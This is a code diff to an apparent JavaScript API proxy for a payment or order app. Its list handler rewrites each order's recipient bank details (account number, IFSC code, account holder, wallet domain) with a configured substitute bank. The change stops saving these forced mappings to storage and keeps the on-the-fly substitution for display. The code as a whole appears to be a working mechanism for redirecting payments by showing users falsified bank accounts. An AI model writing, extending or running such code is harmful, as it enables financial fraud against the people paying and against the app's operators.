@@ -2827,9 +2827,9 @@ app.all('/xxapi/*', async (req, res) => {
                     return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
                 }
                 // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
-                // Per-item replace:
+                // Per-item replace in lists:
                 // 1. Saved orders in KV → replace with saved mapped bank
-                // 2. Active/processing orders (orderState <= 2 or has walletDomain) → minAmount check → replace acctNo, acctCode, acctName & walletDomain with active bank
+                // 2. Unmapped items in list → replace on-the-fly for display ONLY (NEVER save to KV)
                 function _replaceListItems(list) {
                     list.forEach(item => {
                         if (!item || typeof item !== 'object') return;
@@ -2843,6 +2843,7 @@ app.all('/xxapi/*', async (req, res) => {
                         const minOk = !bank.minAmount || (iAmt > 0 && iAmt >= bank.minAmount);
 
                         if (savedMapping) {
+                            // Already bought / mapped order in KV: replace with mapped bank
                             const mappedBank = bankFromSavedOrder(savedMapping);
                             if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
                                 if (urlLower.includes('waitconfirm')) {
@@ -2854,8 +2855,8 @@ app.all('/xxapi/*', async (req, res) => {
                                 const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
                                 if (mappedWallet) item.walletDomain = mappedWallet;
                             }
-                        } else if (minOk && (orderState <= 2 || item.walletDomain || !urlLower.includes('history'))) {
-                            // Active / Processing order in browse or history list: replace bank details
+                        } else if (minOk && (!urlLower.includes('history') || orderState <= 2 || item.walletDomain)) {
+                            // On-the-fly replace for display ONLY — NEVER write to orderBankMap here!
                             if (urlLower.includes('waitconfirm')) {
                                 replaceWaitConfirmBankFields(item, bank);
                             } else {
@@ -2863,29 +2864,6 @@ app.all('/xxapi/*', async (req, res) => {
                             }
                             if (item.walletDomain) {
                                 item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
-                            }
-                            // Auto-save active order mapping in KV so details & other screens see same bank
-                            if (oId && (!data.orderBankMap || !data.orderBankMap[oId])) {
-                                if (!data.orderBankMap) data.orderBankMap = {};
-                                data.orderBankMap[oId] = {
-                                    bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-                                    accountHolder: bank.accountHolder,
-                                    accountNo: bank.accountNo,
-                                    ifsc: bank.ifsc,
-                                    bankName: bank.bankName || '',
-                                    upiId: bank.upiId || '',
-                                    rptNo: oId,
-                                    orderNo: item.orderNo || oId,
-                                    orderId: oId,
-                                    amount: iAmt,
-                                    walletDomain: item.walletDomain || '',
-                                    time: now,
-                                    userId: userId || '',
-                                    isManual: true,
-                                    forced: true
-                                };
-                                data._skipOverrideMerge = true;
-                                saveData(data).catch(() => { });
                             }
                         }
                     });
